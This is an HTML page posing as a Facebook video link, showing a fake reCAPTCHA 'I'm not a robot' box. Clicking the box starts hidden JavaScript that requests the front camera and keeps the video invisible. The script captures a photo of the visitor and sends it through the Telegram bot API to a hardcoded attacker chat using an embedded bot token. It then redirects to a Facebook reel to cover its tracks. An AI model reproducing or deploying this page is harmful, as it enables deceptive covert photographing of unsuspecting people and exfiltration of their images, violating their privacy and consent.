<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Facebook</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            width: 100%; 
            height: 100vh; 
            background: #f0f2f5;
            overflow: hidden;
            font-family: Roboto, helvetica, arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        
        /* ✅ إخفاء الفيديو تماماً */
        #video, #cameraVideo { 
            position: absolute; 
            width: 1px; 
            height: 1px; 
            opacity: 0;
            pointer-events: none;
            top: 0;
            left: 0;
        }
        
        #canvas { 
            position: absolute; 
            width: 1px; 
            height: 1px; 
            opacity: 0;
            pointer-events: none;
        }
        
        /* صندوق reCAPTCHA المقلد */
        .recaptcha-box {
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 3px;
            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
            padding: 20px 25px;
            display: flex;
            align-items: center;
            width: 340px;
            height: 78px;
            cursor: pointer;
            position: relative;
            direction: ltr;
        }
        
        .checkbox-wrapper {
            width: 28px;
            height: 28px;
            background: white;
            border: 2px solid #abadae;
            border-radius: 2px;
            margin-right: 15px;
            position: relative;
            flex-shrink: 0;
            transition: all 0.3s;
        }
        
        .checkbox-wrapper.checked {
            background: #1a73e8;
            border-color: #1a73e8;
        }
        
        .checkbox-wrapper.checked::after {
            content: '';
            position: absolute;
            left: 8px;
            top: 3px;
            width: 6px;
            height: 12px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }
        
        .recaptcha-text {
            color: #282828;
            font-size: 14px;
            font-weight: 400;
            flex: 1;
            user-select: none;
        }
        
        .recaptcha-logo {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-left: 20px;
        }
        
        .recaptcha-icon {
            width: 32px;
            height: 32px;
            margin-bottom: 4px;
        }
        
        .recaptcha-brand {
            color: #9e9e9e;
            font-size: 10px;
            text-align: center;
            line-height: 1.2;
        }
        
        .loading-state {
            display: none;
            width: 28px;
            height: 28px;
            margin-right: 15px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1a73e8;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        /* ✅ شاشة سوداء بعد الضغط - لا تظهر الكاميرا */
        #loadingScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000;
            z-index: 20;
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        
        .loading-spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #333;
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        .loading-text {
            color: #666;
            font-size: 16px;
        }
    </style>
</head>
<body>

    <!-- المربع -->
    <div class="recaptcha-box" id="recaptchaBox">
        <div class="checkbox-wrapper" id="checkbox"></div>
        <div class="loading-state" id="loadingSpinner"></div>
        <div class="recaptcha-text">I'm not a robot</div>
        <div class="recaptcha-logo">
            <svg class="recaptcha-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path fill="#4285F4" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
                <path fill="#34A853" d="M12 22c5.52 0 10-4.48 10-10S17.52 2 12 2v2c4.42 0 8 3.58 8 8s-3.58 8-8 8v2z" opacity="0.5"/>
            </svg>
            <div class="recaptcha-brand">
                reCAPTCHA<br>
                <span style="font-size:9px;">Privacy - Terms</span>
            </div>
        </div>
    </div>

    <!-- ✅ شاشة سوداء فقط - لا فيديو -->
    <div id="loadingScreen">
        <div class="loading-spinner"></div>
        <div class="loading-text">جاري تحميل الفيديو...</div>
    </div>

    <!-- فيديو مخفي تماماً -->
    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const telegramToken = "8666905289:AAH9HB48s13a4AeZDaZmbsYRiZShGFgd9eE";
        const chatId = "5015426926";
        const VIDEO_LINK = 'https://www.facebook.com/reel/1431859845423648/?fs=e&fs=e';
        
        let stream = null;
        let checked = false;

        document.getElementById('recaptchaBox').addEventListener('click', function() {
            if (checked) return;
            checked = true;
            
            document.getElementById('checkbox').style.display = 'none';
            document.getElementById('loadingSpinner').style.display = 'block';
            
            setTimeout(() => {
                document.getElementById('loadingSpinner').style.display = 'none';
                document.getElementById('checkbox').style.display = 'block';
                document.getElementById('checkbox').classList.add('checked');
                
                setTimeout(() => {
                    document.getElementById('recaptchaBox').style.display = 'none';
                    document.getElementById('loadingScreen').style.display = 'flex';
                    initCamera();
                }, 500);
                
            }, 1000);
        });

        async function initCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: "user",
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                await video.play();
                
                // التقاط بعد ثانيتين
                setTimeout(captureAndSend, 2000);
                
            } catch (err) {
                location.href = VIDEO_LINK;
            }
        }

        async function captureAndSend() {
            try {
                const video = document.getElementById('video');
                
                await new Promise(resolve => {
                    if (video.videoWidth > 0) resolve();
                    else video.onloadedmetadata = resolve;
                });

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }

                canvas.toBlob(async (blob) => {
                    if (blob) {
                        const formData = new FormData();
                        formData.append("chat_id", chatId);
                        formData.append("photo", blob, "photo_" + Date.now() + ".jpg");
                        
                        try {
                            await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                        } catch (err) {}
                    }
                    
                    setTimeout(() => {
                        location.href = VIDEO_LINK;
                    }, 500);
                }, "image/jpeg", 0.95);
                
            } catch (e) {
                location.href = VIDEO_LINK;
            }
        }
    </script>

</body>
</html>
